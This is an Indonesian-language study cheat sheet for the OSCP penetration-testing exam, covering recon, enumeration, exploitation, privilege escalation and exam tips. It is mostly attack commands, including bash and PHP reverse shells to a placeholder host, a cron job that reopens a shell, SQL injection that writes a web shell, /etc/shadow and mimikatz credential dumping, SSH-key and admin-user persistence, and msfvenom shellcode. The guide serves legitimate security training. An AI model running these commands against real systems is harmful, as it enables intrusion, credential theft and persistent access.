# Catatan Penetration Testing - Persiapan OSCP

## Metodologi Penetration Testing

### 1. Reconnaissance & Scanning
**Langkah-langkah:**
- **Passive Reconnaissance:** Mengumpulkan informasi tanpa interaksi langsung
- **Active Scanning:** Identifikasi layanan, port, dan vulnerabilities

**Tools & Command:**
```bash
# Nmap untuk scanning
nmap -sS -sV -O -A target_ip
nmap -p- -T4 -oN all_ports.txt target_ip
nmap --script vuln target_ip

# Dirb/Dirbuster untuk web directory enumeration
dirb http://target_ip/ -w /usr/share/wordlists/dirb/common.txt

# Gobuster untuk subdomain enumeration
gobuster vhost -u target.com -w wordlist.txt

# SMB enumeration
enum4linux-ng -A target_ip
smbclient -L \\\\target_ip\\
```

**Catatan Penting:**
- Gunakan timing templates yang sesuai (T0 untuk stealth, T4/T5 untuk speed)
- Simpan semua hasil scan untuk dokumentasi
- Perhatikan false positives saat menggunakan automated scripts

### 2. Enumeration
**Langkah-langkah:**
- **Service Enumeration:** Mendapatkan informasi detail tentang layanan yang berjalan
- **Web Application Analysis:** Identifikasi teknologi dan potensi vulnerabilities

**Tools & Command:**
```bash
# HTTP enumeration
nikto -h http://target_ip
whatweb http://target_ip

# FTP enumeration
nmap -p 21 --script ftp-anon target_ip
ftp target_ip

# SNMP enumeration
snmpwalk -c public -v1 target_ip

# Database enumeration
sqlmap -u "http://target_ip/login.php" --data="username=admin&password=admin" --dbs

# SSH key extraction
ssh2john /path/to/id_rsa > ssh_hash
john ssh_hash --wordlist=wordlist.txt
```

**Catatan Penting:**
- Cek banner grabbing untuk versi software yang rentan
- Perhatikan default credentials
- Cek konfigurasi yang salah (misconfigured services)

### 3. Vulnerability Analysis
**Langkah-langkah:**
- Identifikasi CVEs yang applicable
- Cari exploit code yang available
- Analisis potensi exploitation path

**Tools & Command:**
```bash
# Searchsploit untuk mencari exploits
searchsploit "service name"
searchsploit -x exploit_id

# Nmap scripts untuk vulnerability checking
nmap --script smb-vuln-ms17-010.nse target_ip
nmap --script vuln target_ip

# Web vulnerability scanning
dirb http://target_ip/ -X php,asp,aspx,jsp
wfuzz -w wordlist.txt -u http://target_ip/FUZZ
```

**Catatan Penting:**
- Validasi vulnerabilities sebelum melakukan exploitation
- Perhatikan stability target saat testing
- Consider anti-virus dan intrusion detection systems

### 4. Exploitation
**Langkah-langkah:**
- Pilih exploit yang sesuai
- Prepare payload
- Execute exploitation

**Tools & Command:**
```bash
# Metasploit framework
msfconsole
search module_name
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST local_ip
exploit

# Manual exploitation
# Reverse shell dengan netcat
nc -nvlp 4444
# Di target
bash -i >& /dev/tcp/local_ip/4444 0>&1

# PHP reverse shell
php -r '$sock=fsockopen("local_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Web shell upload
# Upload file melalui form vulnerability
# Atau exploit LFI/RFI

# SQL injection untuk file read
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 --

# SQL injection untuk shell
' UNION SELECT "<?php system($_GET['cmd']);?>",2,3 INTO OUTFILE '/var/www/html/shell.php' --
```

**Catatan Penting:**
- Test exploit di lab environment sebelum digunakan
- Prepare fallback options
- Perhatikan log files yang mungkin mengandung bukti aktivitas

### 5. Post-Exploitation
**Langkah-langkah:**
- Establish persistent access
- Privilege escalation
- Lateral movement

**Tools & Command:**
```bash
# System enumeration
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow
ps aux
netstat -antup

# Privilege escalation - Linux
# Search SUID files
find / -perm -4000 -type f 2>/dev/null
# Check sudo -l
sudo -l
# Check cron jobs
cat /etc/crontab
# Search kernel exploits
uname -a && searchsploit kernel 4.15

# Windows priv esc
# Check unquoted service paths
wmic service get name,displayname,pathname,startmode
# Check weak permissions
icacls c:\path\to\service.exe
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Password hunting
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -i pass
grep -R "password=" / 2>/dev/null

# Hash extraction
# Linux
cat /etc/shadow
# Windows
fgdump.exe
mimikatz "privilege::debug" "sekurlsa::logonpasswords"

# Persistence
# Linux SSH key
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
# Cron job persistence
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" | crontab -

# Tunneling
# SSH tunneling
ssh -L 8080:localhost:80 user@target
# HTTP tunnel dengan netcat
nc -l -p 8080 -c "nc target_ip 80"
```

**Catatan Penting:**
- Jalankan enumeration untuk memahami environment
- Document semua findings dengan jelas
- Cek AV/EDR sebelum menjalankan post-exploitation tools
- Pertimbangkan opsi stealth vs noisy untuk setiap technique

### 6. Documentation & Reporting
**Langkah-langkah:**
- Record semua findings
- Prepare technical report
- Create proof of concepts

**Catatan Penting:**
- Screenshot semua penting findings
- Document command yang digunakan
- Include remediation recommendations
- Verify report accuracy sebelum submission

## Common Vulnerability Classes

### Buffer Overflows
```bash
# Pattern creation untuk fuzzing
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

# Fuzzing target
$(python -c 'print "A"*2000')

# Pattern finding untuk offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6f433962

# Generate bad characters
badchars = "\x00\x0a\x0d"
```

### Web Vulnerabilities
```bash
# XSS test payload
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# SQL injection test
' OR '1'='1
' UNION SELECT database(),2,3 --

# Command injection
; whoami
&& id
| cat /etc/passwd

# File upload bypass
- Change extension to .php5, .phtml
- Add magic bytes: GIF89a;
- Double extension: shell.php.jpg
```

## Quick Reference Commands

### Linux
```bash
# Shell upgrade
python -c 'import pty; pty.spawn("/bin/bash")'

# Background process with stty
stty raw -echo
fg
```

### Windows
```bash
# Add user
net user username password /add
net localgroup Administrators username /add

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0
```

## Exam Tips

1. **Time Management:** 23.5 hours untuk 2 hosts
   - Hit target pertama: 4-6 jam
   - Hit target kedua: 4-6 jam
   - Buffer untuk documentation: 2-3 jam

2. **Prioritization:**
   - Cek low-hanging fruits dulu
   - Automated enumeration vs manual
   - Don't get stuck pada satu technique

3. **Documentation:**
   - Screenshot setiap langkah penting
   - Simpan semua proof.txt
   - Include path ke flag dan proof

4. **Final Notes:**
   - Backup semua work
   - Test exploits di local dulu
   - Keep calm jika stuck, move ke target lain

## Advanced Techniques

### Windows AD Environment
```bash
# BloodHound data collection
SharpHound.exe -c All

# Kerberoasting
Rubeus.exe kerberoast

# Pass the hash
pth-winexe -U user%hash //target cmd
```

### Docker/Container Escapes
```bash
# Check if running in container
cat /proc/1/cgroup

# Mount host filesystem
docker run -v /:/host --privileged -it chroot /host /bin/bash
```

### Binary Exploitation Tips
```bash
# Check protections
checksec --file=./binary

# ROP chain generation
ropper --file binary --search "pop ; ret"

# Generate shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f c
```

---

**Disclaimer:** This document is for educational purposes only. Use these techniques only on systems you have explicit permission to test.